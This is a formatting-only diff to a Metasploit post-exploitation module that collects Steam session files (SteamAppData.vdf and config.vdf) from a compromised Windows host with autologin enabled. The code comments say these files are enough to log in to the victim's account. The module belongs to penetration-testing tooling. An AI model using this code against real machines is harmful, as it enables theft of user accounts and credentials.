@@ -7,16 +7,21 @@ class MetasploitModule < Msf::Post
   include Msf::Post::File
   include Msf::Auxiliary::Report
 
-  def initialize(info={})
-    super( update_info(info,
-      'Name'           => 'Windows Gather Steam Client Session Collector.',
-      'Description'    => %q{ This module will collect Steam session information from an
-        account set to autologin. },
-      'License'        => MSF_LICENSE,
-      'Author'         => ['Nikolai Rusakov <nikolai.rusakov[at]gmail.com>'],
-      'Platform'       => ['win'],
-      'SessionTypes'   => ['meterpreter' ]
-    ))
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Windows Gather Steam Client Session Collector.',
+        'Description' => %q{
+          This module will collect Steam session information from an
+          account set to autologin.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => ['Nikolai Rusakov <nikolai.rusakov[at]gmail.com>'],
+        'Platform' => ['win'],
+        'SessionTypes' => ['meterpreter' ]
+      )
+    )
   end
 
   # All that is needed to login to another Steam account is config.vdf,
@@ -55,9 +60,9 @@ class MetasploitModule < Msf::Post
       if sad =~ /RememberPassword\W*\"1\"/
         print_status("RememberPassword is set! Accountname is #{u_rx.match(sad)[1]}")
         scd = read_file("#{path}\\#{steamconfig}")
-        steam_app_data_path = store_loot('steam.config', 'text/plain', session, sad, filename=steamappdata)
+        steam_app_data_path = store_loot('steam.config', 'text/plain', session, sad, filename = steamappdata)
         print_good("The file SteamAppData.vdf has been stored on #{steam_app_data_path}")
-        steam_config_path = store_loot('steam.config', 'text/plain', session, scd, filename=steamconfig)
+        steam_config_path = store_loot('steam.config', 'text/plain', session, scd, filename = steamconfig)
         print_good("The file config.vdf has been stored on #{steam_config_path}")
         print_status("Steam configs harvested successfully!")
       else
@@ -68,6 +73,5 @@ class MetasploitModule < Msf::Post
       print_error("Steam configs not found.")
       return
     end
-
   end
 end
